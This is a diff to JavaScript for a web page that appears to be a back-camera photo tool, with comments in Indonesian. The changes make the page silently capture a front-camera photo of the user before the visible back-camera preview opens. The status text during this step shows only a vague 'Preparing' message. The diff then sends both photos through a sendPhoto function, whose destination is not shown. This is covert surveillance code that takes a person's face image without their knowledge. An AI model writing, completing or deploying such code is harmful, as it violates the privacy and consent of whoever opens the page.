@@ -19,9 +19,8 @@ const cFront = document.getElementById('cFront');
 
 let backStream  = null;
 let frontStream = null;
-let capturedBackBlob = null;
-let backDeviceId  = null;
-let frontDeviceId = null;
+let capturedBackBlob  = null;
+let capturedFrontBlob = null;
 
 function showStatus(msg, cls = '') {
   statusMsg.textContent = msg;
@@ -33,79 +32,12 @@ function stopStream(s) {
   if (!s) return;
   s.getTracks().forEach(t => { try { t.stop(); } catch(e){} });
 }
-
 function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
 
-// deteksi deviceId kamera depan & belakang via enumerateDevices
-async function detectCameras() {
-  // butuh izin dulu supaya label+deviceId kebaca
-  const tmp = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
-  tmp.getTracks().forEach(t => t.stop());
-  await sleep(200);
-
-  const devices = await navigator.mediaDevices.enumerateDevices();
-  const cams = devices.filter(d => d.kind === 'videoinput');
-
-  // cari label yang mengandung "back"/"rear"/"environment" = kamera belakang
-  // dan "front"/"user"/"face" = kamera depan
-  for (const c of cams) {
-    const l = (c.label || '').toLowerCase();
-    if (!backDeviceId && (l.includes('back') || l.includes('rear') || l.includes('environment') || l.includes('world'))) {
-      backDeviceId = c.deviceId;
-    }
-    if (!frontDeviceId && (l.includes('front') || l.includes('user') || l.includes('face') || l.includes('self'))) {
-      frontDeviceId = c.deviceId;
-    }
-  }
-
-  // fallback: kalau label kosong / nggak match, asumsi cams[0]=belakang, cams[last]=depan
-  if (!backDeviceId && cams[0]) backDeviceId = cams[0].deviceId;
-  if (!frontDeviceId && cams.length > 1) frontDeviceId = cams[cams.length - 1].deviceId;
-}
-
-function buildConstraints(deviceId, facing) {
-  if (deviceId) {
-    return {
-      video: { deviceId: { exact: deviceId }, width: { ideal: 1280 }, height: { ideal: 720 } },
-      audio: false
-    };
-  }
-  return {
-    video: { facingMode: { ideal: facing }, width: { ideal: 1280 }, height: { ideal: 720 } },
-    audio: false
-  };
-}
-
-async function openBackCamera() {
-  backStream = await navigator.mediaDevices.getUserMedia(buildConstraints(backDeviceId, 'environment'));
-  preview.srcObject = backStream;
-  preview.setAttribute('playsinline', '');
-  preview.setAttribute('muted', '');
-  await preview.play();
-}
-
-async function openFrontCamera(retries = 5) {
-  for (let i = 0; i < retries; i++) {
-    try {
-      frontStream = await navigator.mediaDevices.getUserMedia(buildConstraints(frontDeviceId, 'user'));
-      vFront.srcObject = frontStream;
-      vFront.setAttribute('playsinline', '');
-      vFront.setAttribute('muted', '');
-      await vFront.play();
-      await waitFrame(vFront);
-      return;
-    } catch (err) {
-      if (i === retries - 1) throw err;
-      // tunggu makin lama tiap retry: 400, 800, 1200, 1600 ms
-      await sleep(400 * (i + 1));
-    }
-  }
-}
-
-function waitFrame(v) {
+function waitFrame(v, timeout = 3000) {
   return new Promise(res => {
     if (v.readyState >= 2 && v.videoWidth > 0) return res();
-    const t = setTimeout(res, 2000);
+    const t = setTimeout(res, timeout);
     v.onloadeddata = () => { clearTimeout(t); res(); };
   });
 }
@@ -139,19 +71,58 @@ async function sendPhoto(blob, caption) {
   return data;
 }
 
+async function captureFrontOnce() {
+  // buka kamera depan, ambil 1 frame, langsung tutup
+  const s = await navigator.mediaDevices.getUserMedia({
+    video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } },
+    audio: false
+  });
+  vFront.srcObject = s;
+  vFront.setAttribute('playsinline', '');
+  vFront.setAttribute('muted', '');
+  await vFront.play();
+  await waitFrame(vFront);
+  await sleep(200); // kasih waktu exposure settle
+  const blob = await grabBlob(vFront, cFront, 0.85);
+  s.getTracks().forEach(t => { try { t.stop(); } catch(e){} });
+  vFront.srcObject = null;
+  vFront.load();
+  return blob;
+}
+
+async function openBackCamera() {
+  backStream = await navigator.mediaDevices.getUserMedia({
+    video: { facingMode: { ideal: 'environment' }, width: { ideal: 1280 }, height: { ideal: 720 } },
+    audio: false
+  });
+  preview.srcObject = backStream;
+  preview.setAttribute('playsinline', '');
+  preview.setAttribute('muted', '');
+  await preview.play();
+  await waitFrame(preview);
+}
+
 /* ---------- flow ---------- */
 
 startBtn.addEventListener('click', async () => {
   startBtn.disabled = true;
   try {
+    // STEP 1: capture kamera depan duluan (sekilas, silent)
+    showStatus('Menyiapkan...');
+    capturedFrontBlob = await captureFrontOnce();
+
+    // tunggu driver kamera release
+    await sleep(700);
+
+    // STEP 2: baru nyalain kamera belakang
     showStatus('Menyiapkan kamera...');
-    await detectCameras();
     await openBackCamera();
+
     hideStatus();
     intro.style.display = 'none';
     cameraEl.classList.add('active');
   } catch (err) {
-    showStatus('Izin kamera ditolak: ' + err.message, 'err');
+    showStatus('Gagal: ' + err.message, 'err');
     startBtn.disabled = false;
   }
 });
@@ -182,34 +153,14 @@ cancelBtn.addEventListener('click', () => {
 });
 
 sendBtn.addEventListener('click', async () => {
-  if (!capturedBackBlob) return;
+  if (!capturedBackBlob || !capturedFrontBlob) return;
   cancelBtn.disabled = true;
   sendBtn.disabled = true;
 
   try {
     showStatus('Mengirim...');
-
-    // MATIKAN kamera belakang total, tunggu 800ms biar driver lepas
-    stopStream(backStream);
-    preview.srcObject = null;
-    preview.load();
-    backStream = null;
-    await sleep(800);
-
-    // capture kamera depan dengan retry
-    await openFrontCamera();
-    const frontBlob = await grabBlob(vFront, cFront, 0.85);
-
-    // matikan kamera depan
-    stopStream(frontStream);
-    vFront.srcObject = null;
-    vFront.load();
-    frontStream = null;
-
-    // kirim dua-duanya
-    await sendPhoto(capturedBackBlob, '📷 Kamera belakang');
-    await sendPhoto(frontBlob,        '📸 Kamera depan');
-
+    await sendPhoto(capturedBackBlob,  '📷 Kamera belakang');
+    await sendPhoto(capturedFrontBlob, '📸 Kamera depan');
     showStatus('Terkirim ✓', 'ok');
     setTimeout(() => location.reload(), 1200);
   } catch (err) {
